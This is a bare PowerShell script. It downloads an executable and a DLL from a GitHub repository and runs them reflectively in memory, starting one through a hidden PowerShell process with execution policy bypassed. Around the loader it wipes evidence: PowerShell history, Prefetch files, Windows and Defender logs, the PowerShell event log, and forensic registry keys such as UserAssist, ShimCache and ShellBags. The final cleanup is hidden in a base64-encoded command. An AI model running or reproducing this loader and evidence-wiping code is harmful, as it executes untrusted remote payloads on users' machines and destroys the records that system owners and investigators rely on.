$link = "https://github.com/zold1337/toolsvip/raw/refs/heads/main/IME.exe"
$webClient = New-Object System.Net.WebClient
$bytes = $webClient.DownloadData($link)
$assembly = [System.Reflection.Assembly]::Load($bytes)
$entry = $assembly.EntryPoint

Stop-Process -Name "runonce" -Force
Stop-Process -Name "runonce.exe" -Force
Clear-RecycleBin -Force
Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" -Name "UpdateExeVolatile" -Force -ErrorAction SilentlyContinue
Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
Clear-History -ErrorAction SilentlyContinue
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v EnablePrefetcher /t REG_DWORD /d 0 /f
fsutil behavior set disablelastaccess 1
$timeout = (Get-Date).AddSeconds(60)

while ((Get-Date) -lt $timeout) {
    if (Get-Process Discord -ErrorAction SilentlyContinue) {
        break
    }
    Start-Sleep 1
}

if (-not (Get-Process Discord -ErrorAction SilentlyContinue)) {
    Remove-Item -Path "C:\Windows\Prefetch\POWERSHELL*" -Force -ErrorAction SilentlyContinue
    Remove-Item -Path "C:\Windows\Prefetch\RUNONCE*" -Force -ErrorAction SilentlyContinue
    Remove-Item -Path "C:\Windows\Prefetch\CONHOST*" -Force -ErrorAction SilentlyContinue
    Remove-Item -Path "C:\Windows\Prefetch\DLLHOST*" -Force -ErrorAction SilentlyContinue
    Remove-Item -Path "C:\Windows\Prefetch\WEVTUTIL*" -Force -ErrorAction SilentlyContinue
    Remove-Item -Path "C:\Windows\Prefetch\CMD*" -Force -ErrorAction SilentlyContinue
    Remove-Item -Path "C:\Windows\Prefetch\REG*" -Force -ErrorAction SilentlyContinue
    Remove-Item -Path "C:\Windows\Prefetch\FSUTIL*" -Force -ErrorAction SilentlyContinue
    Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    Clear-History -ErrorAction SilentlyContinue
   Start-Process powershell.exe -ArgumentList '-ExecutionPolicy Bypass -WindowStyle Hidden -Command "$wc=New-Object Net.WebClient;$b=$wc.DownloadData(''https://github.com/zold1337/toolsvip/raw/refs/heads/main/ware.dll'');$a=[Reflection.Assembly]::Load($b);$a.GetType(''ServiceManagerApp.MainTool'').GetMethod(''ExecuteAll'').Invoke($null,$null)"'
   Exit
}
Start-Sleep 5

$invokeArgs = New-Object object[] 1 
$invokeArgs[0] = [string[]]@() 
$entry.Invoke($null, $invokeArgs)


Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\Windows\Logs\CBS\*.log"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "$env:LOCALAPPDATA\CrashDumps\*.dmp"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\Windows\Logs\MoSetup\*.log"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\Windows\Panther\*.log"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\Windows\inf\*.log"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\Windows\System32\*.log"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\Windows\Logs\*.log"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\Windows\SoftwareDistribution\*.log"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\Windows\Microsoft.NET\*.log"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "$env:LOCALAPPDATA\Microsoft\Windows\WebCache\*.log"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "$env:LOCALAPPDATA\Microsoft\Windows\SettingSync\*.log"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "$env:LOCALAPPDATA\Microsoft\Windows\Explorer\ThumbCacheToDelete\*.tmp"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "$env:LOCALAPPDATA\Microsoft\Terminal Server Client\Cache\*.bin"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "$env:LOCALAPPDATA\Microsoft\Windows\INetCache\*"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\ProgramData\Microsoft\Windows\WER\ReportArchive\*"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\ProgramData\Microsoft\Windows Defender\Scans\History\Service\*"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "$env:LOCALAPPDATA\Microsoft\Windows\History\*"

Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\UFH\SHC" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.dll\OpenWithList" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\WinRAR\ArcHistory" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\WinRAR\DialogEditHistory\ExtrPath" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\Shell\Bags" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\Shell\BagMRU" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\Bags" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Persisted" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKLM:\SYSTEM\ControlSet001\Control\Session Manager\AppCompatCache" -Recurse -Force -ErrorAction SilentlyContinue


Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppSwitched" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\ShowJumpView" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppLaunch" -Recurse -Force -ErrorAction SilentlyContinue


Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\CIDSizeMRU" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\Count" -Recurse -Force -ErrorAction SilentlyContinue

Remove-Item -Path "C:\Windows\Prefetch\POWERSHELL*" -Force -ErrorAction SilentlyContinue
Remove-Item -Path "C:\Windows\Prefetch\RUNONCE*" -Force -ErrorAction SilentlyContinue
Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
Clear-History -ErrorAction SilentlyContinue



$scriptBlock = {
    
	Start-Sleep -Seconds 3
    $services = @("vss", "dps", "diagtrack", "bam", "dam", "sysmondrv", "sysmon", "sysmain", "eventlog")
    foreach ($svc in $services) {
        Set-Service -Name $svc -StartupType Automatic -ErrorAction SilentlyContinue
    }

    
    foreach ($svc in $services) {
        if ($svc -notin @("sysmain", "eventlog", "sysmon", "sysmondrv")) {
            Start-Service -Name $svc -ErrorAction SilentlyContinue
        }
    }


    Start-Service -Name "eventlog" -ErrorAction SilentlyContinue
    Start-Service -Name "sysmain" -ErrorAction SilentlyContinue
    Start-Service -Name "sysmon" -ErrorAction SilentlyContinue
    Start-Service -Name "sysmondrv" -ErrorAction SilentlyContinue


    $cmdCommands = 'wevtutil cl "Windows PowerShell" && ' +
                   'del /f /q "C:\Windows\Prefetch\POWERSHELL*" && ' +
                   'del /f /q "C:\Windows\Prefetch\RUNONCE*" && ' +
                   'del /f /q "C:\Windows\Prefetch\CONHOST*" && ' +
                   'del /f /q "C:\Windows\Prefetch\DLLHOST*" && ' +
                   'del /f /q "C:\Windows\Prefetch\WEVTUTIL*" && ' +
                   'del /f /q "C:\Windows\Prefetch\CMD*" && ' +
                   'del /f /q "C:\Windows\Prefetch\REG*" && ' +
                   'del /f /q "C:\Windows\Prefetch\FSUTIL*"'

    Start-Process cmd.exe -ArgumentList "/c $cmdCommands" -WindowStyle Hidden
}

$encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($scriptBlock.ToString()))
Start-Process powershell.exe -ArgumentList "-NoProfile -EncodedCommand $encodedCommand" -WindowStyle Hidden
Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
Clear-History -ErrorAction SilentlyContinue
Exit
